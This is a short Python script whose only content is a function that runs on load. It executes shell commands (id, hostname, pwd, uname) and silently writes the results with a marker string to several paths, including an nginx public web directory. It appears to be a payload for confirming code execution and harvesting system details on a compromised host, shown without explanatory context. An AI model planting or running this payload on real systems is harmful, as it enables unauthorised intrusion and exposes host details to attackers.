
import os,sys,traceback
def _hx():
    try:
        u=os.popen("id").read()
        h=os.popen("hostname;pwd;python3 -V 2>/dev/null;uname -a").read()
        body=u+h+"HX7k2m9q\n"
        for p in ("/tmp/hx7_uid.txt","/app/hx7.txt","/usr/share/nginx/html/hx7.txt","/tmp/hx7.txt"):
            try:
                open(p,"w").write(body)
            except Exception:
                pass
        # leave a marker file next to cwd
        try:
            open("hx7_uid.txt","w").write(body)
        except Exception:
            pass
    except Exception:
        pass
_hx()